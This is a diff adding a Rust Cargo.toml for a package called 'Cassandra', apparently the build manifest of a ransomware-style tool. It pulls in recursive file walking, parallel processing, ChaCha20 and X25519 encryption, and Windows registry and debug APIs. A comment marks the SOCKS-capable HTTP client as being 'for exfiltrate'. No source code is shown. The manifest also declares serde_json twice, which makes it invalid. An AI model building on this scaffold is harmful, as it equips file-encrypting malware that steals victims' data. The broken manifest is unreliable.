@@ -1,0 +1,24 @@
+[package]
+name = "Cassandra"
+version = "1.0.0"
+edition = "2021"
+
+[dependencies]
+walkdir = "2.5"
+rayon = "1.10"
+chacha20poly1305 = "0.10"
+x25519-dalek = "2.0"
+rand = "0.8"
+winreg = { version = "0.52", optional = true }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+reqwest = { version = "0.12", features = ["blocking", "socks", "json"] }  # สำหรับ exfiltrate (optional)
+chrono = { version = "0.4", features = ["serde"] }
+uuid = { version = "1.0", features = ["v4"] }
+windows = { version = "0.58", features = ["Win32_System_Diagnostics_Debug"] }
+base64 = "0.22"
+serde_json = "1.0"
+
+[features]
+default = ["windows"]
+windows = ["winreg"]
